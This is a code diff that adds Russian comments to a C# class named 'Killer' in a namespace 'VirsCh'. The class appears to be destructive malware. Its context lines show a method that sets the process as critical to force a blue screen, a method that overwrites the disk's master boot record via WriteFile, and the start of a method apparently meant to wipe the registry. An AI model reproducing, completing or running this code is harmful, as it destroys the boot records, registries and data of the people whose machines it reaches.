@@ -6,6 +6,7 @@ namespace VirsCh
 {
     class Killer
     {
+        // Регистрация DLL
         [DllImport("kernel32")]
         private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess,
             uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition,
@@ -20,6 +21,7 @@ namespace VirsCh
         private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass,
             ref int processInformation, int processInformationLength);
 
+        // Вызов синего экрана
         static public void BSOD()
         {
             int isCritical = 1;
@@ -29,6 +31,7 @@ namespace VirsCh
             NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
         }
 
+        // Удоление MBR
         static public void MBR()
         {
             const uint GenericAll = 0x10000000;
@@ -45,6 +48,7 @@ namespace VirsCh
             WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten, IntPtr.Zero);
         }
 
+        // Удоление риестра
         static public void RegFuck()
         {
             ProcessStartInfo reg_kill = new ProcessStartInfo();
